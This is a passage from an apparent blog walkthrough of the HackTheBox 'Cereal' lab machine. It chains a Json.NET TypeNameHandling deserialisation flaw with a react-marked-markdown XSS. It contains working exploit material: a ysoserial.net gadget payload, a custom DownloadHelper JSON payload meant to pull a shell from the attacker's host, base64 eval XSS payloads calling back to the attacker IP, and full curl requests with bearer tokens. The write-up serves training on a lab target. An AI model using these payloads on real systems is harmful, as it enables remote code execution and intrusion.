    -H $'Host: 10.10.10.217' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTgzMDA5ODMsIm5hbWUiOjF9.VgWvwKp0RMrr4NLnJxnIWoUJII3JQlUJecyFVpDlXvo' -H $'Content-Type: application/json' -H $'Content-Length: 86' \
    --data-binary $'{\"JSON\":\"{\\\"title\\\":\\\"t\\\",\\\"flavor\\\":\\\"f\\\",\\\"color\\\":\\\"#FFF\\\",\\\"description\\\":\\\"d\\\"}\"}' \
    $'https://10.10.10.217/requests'
```

# Deserialisation

Now we can create a cereal, we want to make one that leverages the deserialisation vulnerability.

I searched ".net deserialisation" in Google and immediately found the following [Medium article](https://medium.com/@frycos/yet-another-net-deserialization-35f6ce048df7). It mentions `TypeNameHandling` vulnerabilities, so I did some more digging into how these work.

I found the following posts:
- https://stackoverflow.com/questions/49038055/external-json-vulnerable-because-of-json-net-typenamehandling-auto/49040862
- https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html

They talk about insecure JSON conversions leading to deserialisation vulnerabilities - sure enough, `Controllers/RequestsController.cs` has the following code:

![](/assets/images/blogs/Pasted image 20210607210556.png)

Essentially, the vulnerability allows overwriting the type of the object when it is parsed from JSON. It *should* be turned into a `Cereal` object - but if we supply a `$type` field in our JSON, we can create an object of any other class, as the `TypeNameHandling.Auto` call parses it automatically.

Now we need to find a gadget that allows for Remote Code Execution - i.e. a class on the project's classpath that executes code in one of its constructor or setter methods.

## ysoserial.net

*Note:* as always, I'll detail my thought process - but this technique did not actually work, so you can skip to me [finding the correct gadget](#custom-gadget-chain) if you wish.

---

What do you know? Here we have a [.NET based Gadget Chain finder](https://github.com/pwntester/ysoserial.net), similar to the original [ysoserial](https://github.com/frohoff/ysoserial)...

This is the tool spotted in the "Security fixes" commit earlier - when I saw this line in the code, I initially misread it as blocking payloads from the `frohoff` repository, and thought the one I found would bypass the defences. I realised my mistake, but still wanted to try and create a payload just to check the defence was sound.

The reference to `ClaimsIdentity` on the usage page immediately stands out. This is imported in the `using System.Security.Claims;` line in `Services/UserService.cs` and used to generate claims for the JWT tokens. I initially assumed as it was not explicitly *named* in the classes that are blacklisted in the security check, we may be able to use it to gain code execution. I would have saved a lot of time if I'd paid attention to the catch-all of classes in the `System` namespace. But let's explore what I tried, so we can understand what the process would be if there was no blacklist.

First, we install the zip from the README in the git repo, then unzip it into `/opt`:

```bash
┌──(mac㉿kali)-[~]
└─$ sudo cp Downloads/ysoserial-1.34.zip /opt/
[sudo] password for mac: 
┌──(mac㉿kali)-[~]
└─$ cd /opt/
┌──(mac㉿kali)-[/opt]
└─$ sudo unzip ysoserial-1.34.zip 
Archive:  ysoserial-1.34.zip
   creating: Release/
...[snip]...
┌──(mac㉿kali)-[/opt]
└─$ sudo mv Release/ ysoserial-dotnet
```

I tried to use `mono` to run the exe, as per the docs in the repo:

```bash
┌──(mac㉿kali)-[/opt/ysoserial-dotnet]
└─$ mono ysoserial.exe -f BinaryFormatter -g ClaimsIdentity -c 'ping 10.10.14.62'

Unhandled Exception:
System.IO.FileNotFoundException: Could not load file or assembly 'PresentationCore, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35' or one of its dependencies.
File name: 'PresentationCore, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35'
  at ysoserial.Generators.GenericGenerator.GenerateWithInit (System.String formatter, ysoserial.Helpers.InputArgs inputArgs) [0x00007] in <0547cad762af461984c6f953f3fc4858>:0 
  at ysoserial.Generators.GenericGenerator.GenerateWithNoTest (System.String formatter, ysoserial.Helpers.InputArgs inputArgs) [0x0000e] in <0547cad762af461984c6f953f3fc4858>:0 
  at ysoserial.Generators.ClaimsIdentityGenerator.Generate (System.String formatter, ysoserial.Helpers.InputArgs inputArgs) [0x00005] in <0547cad762af461984c6f953f3fc4858>:0 
  at ysoserial.Generators.GenericGenerator.GenerateWithInit (System.String formatter, ysoserial.Helpers.InputArgs inputArgs) [0x00007] in <0547cad762af461984c6f953f3fc4858>:0 
  at ysoserial.Program.Main (System.String[] args) [0x004e9] in <0547cad762af461984c6f953f3fc4858>:0 
[ERROR] FATAL UNHANDLED EXCEPTION: System.IO.FileNotFoundException: Could not load file or assembly 'PresentationCore, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35' or one of its dependencies.
File name: 'PresentationCore, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35'
  at ysoserial.Generators.GenericGenerator.GenerateWithInit (System.String formatter, ysoserial.Helpers.InputArgs inputArgs) [0x00007] in <0547cad762af461984c6f953f3fc4858>:0 
  at ysoserial.Generators.GenericGenerator.GenerateWithNoTest (System.String formatter, ysoserial.Helpers.InputArgs inputArgs) [0x0000e] in <0547cad762af461984c6f953f3fc4858>:0 
  at ysoserial.Generators.ClaimsIdentityGenerator.Generate (System.String formatter, ysoserial.Helpers.InputArgs inputArgs) [0x00005] in <0547cad762af461984c6f953f3fc4858>:0 
  at ysoserial.Generators.GenericGenerator.GenerateWithInit (System.String formatter, ysoserial.Helpers.InputArgs inputArgs) [0x00007] in <0547cad762af461984c6f953f3fc4858>:0 
  at ysoserial.Program.Main (System.String[] args) [0x004e9] in <0547cad762af461984c6f953f3fc4858>:0 
```

At this point I figured it would be much easier to run it on Windows than via mono, so I hopped over to my host machine.

On Windows, after downloading the release and unzipping it, I can create a payload to ping my Kali Virtual Machine as follows:

```cmd
D:\ysoserial-1.34\Release>ysoserial.exe -f BinaryFormatter -g ClaimsIdentity -c 'ping 10.10.14.62'
AAEAAAD/////AQAAAAAAAAAEAQAAACVTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1zLkNsYWltc0lkZW50aXR5AQAAABJtX3NlcmlhbGl6ZWRDbGFpbXMBBgUAAADECUFBRUFBQUQvLy8vL0FRQUFBQUFBQUFBTUFnQUFBRjVOYVdOeWIzTnZablF1VUc5M1pYSlRhR1ZzYkM1RlpHbDBiM0lzSUZabGNuTnBiMjQ5TXk0d0xqQXVNQ3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMHpNV0ptTXpnMU5tRmtNelkwWlRNMUJRRUFBQUJDVFdsamNtOXpiMlowTGxacGMzVmhiRk4wZFdScGJ5NVVaWGgwTGtadmNtMWhkSFJwYm1jdVZHVjRkRVp2Y20xaGRIUnBibWRTZFc1UWNtOXdaWEowYVdWekFRQUFBQTlHYjNKbFozSnZkVzVrUW5KMWMyZ0JBZ0FBQUFZREFBQUFzd1U4UDNodGJDQjJaWEp6YVc5dVBTSXhMakFpSUdWdVkyOWthVzVuUFNKMWRHWXRPQ0kvUGcwS1BFOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNpQk5aWFJvYjJST1lXMWxQU0pUZEdGeWRDSWdTWE5KYm1sMGFXRnNURzloWkVWdVlXSnNaV1E5SWtaaGJITmxJaUI0Yld4dWN6MGlhSFIwY0RvdkwzTmphR1Z0WVhNdWJXbGpjbTl6YjJaMExtTnZiUzkzYVc1bWVDOHlNREEyTDNoaGJXd3ZjSEpsYzJWdWRHRjBhVzl1SWlCNGJXeHVjenB6WkQwaVkyeHlMVzVoYldWemNHRmpaVHBUZVhOMFpXMHVSR2xoWjI1dmMzUnBZM003WVhOelpXMWliSGs5VTNsemRHVnRJaUI0Yld4dWN6cDRQU0pvZEhSd09pOHZjMk5vWlcxaGN5NXRhV055YjNOdlpuUXVZMjl0TDNkcGJtWjRMekl3TURZdmVHRnRiQ0krRFFvZ0lEeFBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSXVUMkpxWldOMFNXNXpkR0Z1WTJVK0RRb2dJQ0FnUEhOa09sQnliMk5sYzNNK0RRb2dJQ0FnSUNBOGMyUTZVSEp2WTJWemN5NVRkR0Z5ZEVsdVptOCtEUW9nSUNBZ0lDQWdJRHh6WkRwUWNtOWpaWE56VTNSaGNuUkpibVp2SUVGeVozVnRaVzUwY3owaUwyTWdKM0JwYm1jaUlGTjBZVzVrWVhKa1JYSnliM0pGYm1OdlpHbHVaejBpZTNnNlRuVnNiSDBpSUZOMFlXNWtZWEprVDNWMGNIVjBSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJWYzJWeVRtRnRaVDBpSWlCUVlYTnpkMjl5WkQwaWUzZzZUblZzYkgwaUlFUnZiV0ZwYmowaUlpQk1iMkZrVlhObGNsQnliMlpwYkdVOUlrWmhiSE5sSWlCR2FXeGxUbUZ0WlQwaVkyMWtJaUF2UGcwS0lDQWdJQ0FnUEM5elpEcFFjbTlqWlhOekxsTjBZWEowU1c1bWJ6NE5DaUFnSUNBOEwzTmtPbEJ5YjJObGMzTStEUW9nSUR3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrOWlhbVZqZEVsdWMzUmhibU5sUGcwS1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStDdz09Cw==
```

However, this uses the `BinaryFormatter` and I would ideally like to use the `Json.Net` formatter.

The only gadgets that support this formatter are as follows:

```bash
┌──(mac㉿kali)-[/opt]
└─$ cat ysoserial.net/README.md | grep Json.Net -B 1
	(*) ObjectDataProvider (supports extra options: use the '--fullhelp' argument to view)
		Formatters: DataContractSerializer (2) , FastJson , FsPickler , JavaScriptSerializer , Json.Net , SharpSerializerBinary , SharpSerializerXml , Xaml (4) , XmlSerializer (2) , YamlDotNet < 5.0.0
--
	(*) RolePrincipal
		Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
	(*) SessionSecurityToken
		Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
	(*) SessionViewStateHistoryItem
		Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
--
	(*) WindowsClaimsIdentity [Requires Microsoft.IdentityModel.Claims namespace (not default GAC)] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (3) , DataContractSerializer (2) , Json.Net (2) , LosFormatter (3) , NetDataContractSerializer (3) , SoapFormatter (2)
	(*) WindowsIdentity
		Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
	(*) WindowsPrincipal
		Formatters: BinaryFormatter , DataContractJsonSerializer , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
```

Of these, two are included in the security check (`ObjectDataProvider` and `WindowsClaimsIdentity`), and the others are not on the classpath for the project. 

The security check also looks for the word `system`, which rules out the gadgets `System.Web.Security.RolePrincipal`, `System.IdentityModel.Tokens.SessionSecurityToken`, and `System.Security.WindowsPrincipal`  even if they were on the classpath. I couldn't find the namespace that contains `SessionViewStateHistoryItem`, but [this example](https://referencesource.microsoft.com/#System.Web.Mobile/UI/MobileControls/SessionViewState.cs) makes use of the class and imports entirely `System` libraries, so it would be blocked.

While I could have saved some time by trusting the security fix correctly blocked all 	`ysoserial.net` payloads, I think it was worth doing my due diligence and making sure that none of these gadgets were exploitable. It also taught me a bit more about gadget chains in an unfamiliar language.

However, this makes me sure the defence will work. Instead, I will have to come up with a custom gadget chain.

## Custom Gadget Chain

The relevant controller at `Controllers/RequestsController.cs` uses the following libraries:

```csharp
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Authorization;
using System.Linq;
using Cereal.Models;
using Cereal.Services;
using Newtonsoft.Json;
using System;
```

The four classes in `Models` have no vulnerable looking code - just some gets and sets. I could potentially create a `User` object, but it wouldn't be inserted into the database and even if it were, it would only grant me access to the admin panel.

The only class in `Services` is `Services/UserService.cs`. This doesn't have an overloaded constructor or any get/set methods, and all the variables within the `Authenticate` method are set within the method anyway, so I don't think they would be vulnerable.

However, `Services/UserService.cs` imports a new set of classes that wasn't present in `Controllers/RequestsController.cs`:

```csharp
using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Linq;
using System.Security.Claims;
using System.Text;
using Microsoft.Extensions.Options;
using Microsoft.IdentityModel.Tokens;
using Cereal.Models;
using Cereal.Helpers;
```

It references the `Cereal.Helpers` library. There was no `Helpers` folder, so I did a global search for "helper" in vscode and found something that had been staring me in the face, in the top level of the repository - the `DownloadHelper.cs` class.

This has a `Download()` method that is called in the `set` methods for the `URL` and `Filepath` variables:

```csharp
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Threading.Tasks;

namespace Cereal
{
    public class DownloadHelper
    {
        private String _URL;
        private String _FilePath;
        public String URL
        {
            get { return _URL; }
            set
            {
                _URL = value;
                Download();
            }
        }
        public String FilePath
        {
            get { return _FilePath; }
            set
            {
                _FilePath = value;
                Download();
            }
        }
        private void Download()
        {
            using (WebClient wc = new WebClient())
            {
                if (!string.IsNullOrEmpty(_URL) && !string.IsNullOrEmpty(_FilePath))
                {
                    wc.DownloadFile(_URL, _FilePath);
                }
            }
        }
    }
}
```

If they are both set, a `WebClient.DownloadFile` call is made. According to [its documentation](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-5.0), this method "downloads to a local file data from the URI specified". We can probably use this to upload a shell to the box.

However, `DownloadHelper.cs` is not in the `Cereal.Helpers` namespace (the only class that is being `ExtensionMethods.cs`, which doesn't look useful). I am hoping that, as a result of it being just in the `Cereal` namespace, it will automatically be on the classpath. I am not super familiar with the subtleties of C#, but I will take that assumption and run with it for now.

### Crafting a Payload

I'm going to look at an example from `ysoserial.net` and replicate its structure, replacing the class with the `DownloadHelper` class.

```bash
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd','/ccalc']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

It looks like we need to specify the class in the `$type` field, as suggested by the initial article by frycos, and then set our variables. We will create a test payload for now, and then attempt to make one to download a shell.

I'm unsure the purpose of the `PresentationFramework, Version=...` strings, so I'll look for some documentation on the `Json.Net` formatter and see if it sheds some light on how to call a constructor.

I searched "Json.Net constructor", and found the following: https://stackoverflow.com/questions/23017716/json-net-how-to-deserialize-without-using-the-default-constructor

This suggests that the constructor is the default method that is called when the object is deserialised - this is good. How exactly I call the set methods, however, is unclear.

This [newtonsoft documentation](https://www.newtonsoft.com/json/help/html/DeserializeObject.htm) suggests it is as simple as naming the variables in the JSON. This is the first payload I tried:

```bash
{
	'$type':'Cereal.DownloadHelper',
	'_URL':'http://10.10.14.62/',
	'_FilePath':'test'
}
```

When this JSON is parsed by the `JsonConvert.DeserialiseObject()` call in `Controllers/RequestsController.cs`, it should get deserialised and request the file `test` from our box.

This [turned out](#adjusting-the-filepath) to not be quite right - but to test it, I had to first find a way to request it. It's time to look at some XSS.

# XSS in Admin Panel

We cannot access the Admin Panel, due to it being an authenticated `PrivateRoute`. However, we can see that it renders cereal request objects on the page, which may make it vulnerable to a cross-site scripting attack.

```jsx
<div>
	{requestData &&
		<Card.Body>
			Description:{requestData.description}
			<br />
			Color:{requestData.color}
			<br />
			Flavor:{requestData.flavor}
		</Card.Body>
	}
</div>
```

This is assuming there is a simulated 'admin' user viewing this page. This is sometimes the case on HacktheBox, for example on the Crossfit machine.

**How can we leverage the XSS?**

The IP whitelist means that only the box itself can make requests to certain methods, including the vulnerable one we wish to target. If we can make the box make a HTTP request using javascript, we can bypass the IP restriction.

**Note**

When I first tried this box, I couldn't initially get the XSS working and instead moved on to testing the Deserialisaton. I've reordered what I tried in the writeup slightly as it made more sense this way, but as always you can skip to the [correct method](#fixing-the-xss) if you don't want to read about my failed attempts.

## Trying a Basic XSS

We create a simple javascript file, `0.js`, that makes a request to our box. This is just to test we can run javascript on the box.

```javascript
var oReq = new XMLHttpRequest();
oReq.open("GET", "http://10.10.14.62/example.txt");
oReq.send();
```

We then want to submit a request to this javascript file as a script in the description field.

```javascript
<script src="10.10.14.62/0.js"></script>
```

To generate this, we run the stringify script on the following JSON:

```javascript
console.log(JSON.stringify({ JSON: JSON.stringify({title:'t',flavor:'f',color:'#FFF',description:'<script src="10.10.14.62/0.js"></script>' }) }))
```

Which creates our payload:

```json
{"JSON":"{\"title\":\"t\",\"flavor\":\"f\",\"color\":\"#FFF\",\"description\":\"<script src=\\\"10.10.14.62/0.js\\\"></script>\"}"}
```

We could make the `XMLHTTPRequest()` in the description field, but it is much nicer to request a file as a script source - it keeps the payload short, and allows us to easily edit the file on our box.

Our final bit of setup is to run a netcat listener to catch the request:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ sudo nc -lnvp 80
[sudo] password for mac: 
listening on [any] 80 ...
```

Then we submit the payload and wait for a response:

![](/assets/images/blogs/Pasted image 20210406101322.png)

We don't get anything back to netcat. Creating a `0.html` file that runs our `0.js` script locally does give us a response, so we know the `XMLHTTPRequest` works and the server is setup correctly:

![](/assets/images/blogs/Pasted image 20210406101542.png)

This suggests the description field may not be vulnerable in this way, or there is something preventing the box from making outgoing requests.

## Fixing the XSS

When I first did this box, I wasn't sure which parts of my payload were broken until I tested them all together. It turned out to be, well, both parts. But rather than writing this up in chronological order and having a broken XSS payload for half of my writeup, I've moved the correct CVE to this section. As always, you can skip to the final [working payload](#submitting-our-test-payload) if you want.

### Markdown Overview

When I took another look at the code in `ClientApp/src/AdminPage/AdminPage.jsx`, I noticed something I'd missed before:

![](/assets/images/blogs/Pasted image 20210607210839.png)

I googled "markdown preview xss" first, but that gave me some [generic markdown XSS payloads](https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8). They ultimately didn't look right - I suspected if a basic `<script>` tag wouldn't work on a Hard box, then neither would a [basic script tag rendered by markdown](https://github.com/JakobRPennington/InformationSecurity/blob/master/Payloads/md/XSS.md). So I looked at the source of the `MarkdownPreview` element (`import { MarkdownPreview } from 'react-marked-markdown';`) and googled "react-marked-markdown xss" instead.

This [snyk post](https://snyk.io/vuln/npm:react-marked-markdown:20180517) and corresponding [git repo](https://github.com/advisories/GHSA-m7qm-r2r5-f77q) looked more promising. They described a proof of concept in the `value` field of the `MarkdownPreview` element:

```jsx
import React from 'react'
import ReactDOM from 'react-dom'
import { MarkdownPreview } from 'react-marked-markdown'

ReactDOM.render(
<MarkdownPreview
markedOptions=\{\{ sanitize: true \}\}
value={'[XSS](javascript: alert`1`)'}
/>,
document.getElementById('root')
)
```

Our cereal's `title` is inserted into this field! So in theory we can create one with a title similar to the following:

```jsx
[mouldy cereal](javascript: var oReq = new XMLHttpRequest();oReq.open("GET", "http://localhost/requests?id=9");oReq.send();)
```

To test this works, we need to move on to the next stage - chaining this and the deserialisation payload together.

In general it's good to test things locally before sending them at the remote application, and I would do that on a real assessment. But as it's just HTB and there's no need for opsec, I decided not to fiddle around with building the app locally.

# Exploit Chain

We need to chain together our [XSS](#xss-in-admin-panel) and Deserialisation(#deserialisation) exploits by doing the following:
- creating a 'target cereal' - this is a cereal containing a maliciously crafted JSON that will be deserialised and download a shell from our box to the remote machine
- creating an 'XSS cereal' - this is the cereal that will trigger the deserialisation of the target when an admin user (hopefully) views it on the requests page

As always, you can skip right to the end and see the [working payload](#adjusting-the-filepath) - but you'll miss a lot of frustrating debugging!

## Creating the Target Cereal

We need to create a cereal that contains our serialised object first. As far as I can tell, the entire JSON is passed into the `DeserialiseObject()` call, not the contents of a single field, so we need to replace the entire `JSON` field in our request. Luckily there is no validation to check that the `title`, `flavour` fields etc are present.

First, let's format our payload:

```javascript
console.log(JSON.stringify({ JSON: JSON.stringify({'$type':'Cereal.DownloadHelper','_URL':'http://10.10.14.62/','_FilePath':'test'}) }))
```

This gives us:

```bash
{"JSON":"{\"$type\":\"Cereal.DownloadHelper\",\"_URL\":\"http://10.10.14.62/\",\"_FilePath\":\"test\"}"}
```

Now we try to create the cereal with the following request:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.10.217' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTgzMDA5ODMsIm5hbWUiOjF9.VgWvwKp0RMrr4NLnJxnIWoUJII3JQlUJecyFVpDlXvo' -H $'Content-Type: application/json' -H $'Content-Length: 86' \
    --data-binary $'{"JSON":"{\"$type\":\"Cereal.DownloadHelper\",\"_URL\":\"http://10.10.14.62/\",\"_FilePath\":\"test\"}"}' \
    $'https://10.10.10.217/requests'
```

We get the following response:

```bash
HTTP/2 400 
content-type: application/problem+json; charset=utf-8
server: Microsoft-IIS/10.0
strict-transport-security: max-age=2592000
x-rate-limit-limit: 5m
x-rate-limit-remaining: 5
x-rate-limit-reset: 2021-04-07T15:12:03.7462438Z
x-powered-by: Sugar
date: Wed, 07 Apr 2021 15:07:03 GMT
content-length: 306

{"type":"https://tools.ietf.org/html/rfc7231#section-6.5.1","title":"One or more validation errors occurred.","status":400,"traceId":"|683189f4-4607ffb1b99ae777.","errors":{"$.JSON":["'$' is invalid after a value. Expected either ',', '}', or ']'. Path: $.JSON | LineNumber: 0 | BytePositionInLine: 11."]}}
```

I experimented with some escape characters, before giving up and letting Burp Suite do it for me. Burp exported as the following `curl` command, which also worked in command line:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.10.217' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Cache-Control: max-age=0' -H $'Content-Type: application/json' -H $'Content-Length: 104' -H $'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTgzMDA5ODMsIm5hbWUiOjF9.VgWvwKp0RMrr4NLnJxnIWoUJII3JQlUJecyFVpDlXvo' \
    --data-binary $'{\"JSON\":\"{\\\"$type\\\":\\\"Cereal.DownloadHelper\\\",\\\"_URL\\\":\\\"http://10.10.14.62/\\\",\\\"_FilePath\\\":\\\"test\\\"}\"}' \
    $'https://10.10.10.217/requests'
	
HTTP/2 200 
content-type: application/json; charset=utf-8
server: Microsoft-IIS/10.0
strict-transport-security: max-age=2592000
x-rate-limit-limit: 5m
x-rate-limit-remaining: 1
x-rate-limit-reset: 2021-04-07T15:22:53.5734014Z
x-powered-by: Sugar
date: Wed, 07 Apr 2021 15:21:45 GMT
content-length: 43

{"message":"Great cereal request!","id":9}
```

This inconsistency between `curl` and requests in Burp suite would go on to irritate me for the duration of this box...

## Creating the XSS Cereal

Now we need a cereal that contains some Javascript that will request cereal ID 9. As always, you can skip to the [working payload](#submitting-our-test-payload) if you wish.

This writeup is slightly out of order chronologically - I initially tried squeezing all of my initial XSS attempt into one `<script>` tag in case the box was blocking outgoing requests, creating a payload like so:

```bash
{"JSON":"{\"title\":\"t\",\"flavor\":\"f\",\"color\":\"#FFF\",\"description\":\"<script>var oReq = new XMLHttpRequest();oReq.open(\\\"GET\\\", \\\"http://localhost/requests?id=9\\\");oReq.send();</script>\"}"}
```

As we know, a simple `<script>` tag does not work, and I needed to use the Markdown XSS instead. But testing this was an important step in realising it was not (just?) a firewall policy and was actually my XSS payload that needed changing.

Instead I took a look at my method and settled on testing the markdown payload. So, let's regenerate our payload with `stringify.js` and try again:

```bash
{"JSON":"{\"title\":\"[mouldy cereal](javascript: var oReq = new XMLHttpRequest();oReq.open(\\\"GET\\\", \\\"http://localhost/requests?id=9\\\");oReq.send();)\",\"flavor\":\"f\",\"color\":\"#FFF\",\"description\":\"d\"}"}
```

I submitted this payload in Burp suite, as the `curl` syntax was fiddly. Once I had a working one, I started netcat, and submitted the cereal:

![](/assets/images/blogs/Pasted image 20210407195847.png)

But I got nothing back to my netcat listener.

### Base64 Encoding

I did a lot of debugging of syntax here. There were a couple of key changes:
- switching to one set of backticks (\`\`)
- switching to a base64 encoded payload to eliminate bad characters, and evaluating the payload with `eval()`

However, switching to base64 was a problem in itself. Initially I used a command like `echo [payload] | base64` to generate it, but was told that sometimes this is inconsistent with Javascript's base64 decoding, so would not always work. So I tried to use something like the following code to generate a payload:

```javascript
console.log(btoa('var oReq = new XMLHttpRequest();oReq.open("GET", "http://10.10.14.115/test");oReq.send();'))
```

(this was after spending an hour using `atob()` and making the horrible realisation that, inexplicably, it [did not mean](https://stackoverflow.com/questions/33854103/why-were-javascript-atob-and-btoa-named-like-that) "Ascii to Base64" - I'm not even mad at myself for this one, `b` should stand for base64!)

I came across a few other stupid mistakes like misspellings and changing IP addresses after taking a break from the box. It was a bit of an exhausting process, and might not have been so bad if I'd worked consistently on it rather than sporadically, but I eventually overcame all the issues and got to this payload:

```
{"JSON":"{\"title\":\"[mouldy cereal](javascript: `eval(atob(dmFyIG9SZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTtvUmVxLm9wZW4oIkdFVCIsICJodHRwOi8vMTAuMTAuMTQuMTE1L3Rlc3QiKTtvUmVxLnNlbmQoKTs=))`)\",\"flavor\":\"f\",\"color\":\"#FFF\",\"description\":\"d\"}"}
```

It uses `eval(atob())` to evaluate the base64 encoded javascript in the `title` field (in theory). The base64 here was supposed to make a callback to my box, for testing - it used the following payload:

```javascript
console.log(btoa('var oReq = new XMLHttpRequest();oReq.open("GET", "http://10.10.14.115/test");oReq.send();'))
```

However, I didn't get anything back to my netcat listener. At this stage I was stumped and frustrated. This box had felt very fair and clear up to this point, but I didn't know what I was doing wrong. With a hint, I learned something I had never even thought about from a colleague, and something that would become an important principle on Windows boxes to come.

### HTTPS Restriction

I had not considered that the port I was calling back to might matter. Windows boxes may often have Defender block suspicious ports, such as the common `9001`. However, I was listening on `80` - the problem was that the server somehow had a preference for HTTPS, and would only call out over that protocol. This is apparently because modern browsers don't allow mixed content.

So how to bypass this? The answer lay in an `<img>` tag. Image elements are 'passive' content, which means they're not subject to the same restrictions as other requests. By adding an image to the DOM and setting the `src` attribute to my IP, I could at least see a connection. I thought this trick was really cool - I just had to get it working.

I apparently could also have ran netcat on port 443, but it may not have trusted my cert, and setting that up sounded like more effort than it was worth. All I wanted to do was check that I was getting a connection back and my XSS was working, so an image element request sounded like a good idea.

Here's the basic javascript:

```javascript
const image = document.createElement("img");
image.src = "http://10.10.14.115/img";
document.querySelector(".card").appendChild(image);
```

This creates an image and adds it to the DOM using the `<div>` with the `card` class in the `.jsx` file for the Admin Page.

If we were on a real engagement, we could add an `image.style = "display:hidden"` line to make sure the injected image did not appear in the browser.

Then we encode this payload, as before, and submit it as a cereal:

```
POST /requests HTTP/1.1
Host: 10.10.10.217
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTgzMDA5ODMsIm5hbWUiOjF9.VgWvwKp0RMrr4NLnJxnIWoUJII3JQlUJecyFVpDlXvo
Content-Length: 308

{"JSON":"{\"title\":\"[mouldy cereal](javascript: `eval(atob(Y29uc3QgaW1hZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTtpbWFnZS5zcmMgPSAiaHR0cDovLzEwLjEwLjE0LjExNS9pbWciO2RvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIi5jYXJkIikuYXBwZW5kQ2hpbGQoaW1hZ2UpOw==))`)\",\"flavor\":\"f\",\"color\":\"#FFF\",\"description\":\"d\"}"}
```

But after all that I *still* didn't get a response. I ran a netcat listener on port 443 as well, but got nothing after resubmitting.

At this point I began to wonder if a box reset was needed. There were nearly 140 cereal requests at the point of writing - perhaps some sort of pagination was preventing the XSS from being triggered?

I reset it, resubmitted my payload, and got nothing.

### Local Testing

I wanted to test my payload locally. I didn't want to install .NET and build an entire project, so I just tested the following:

```html
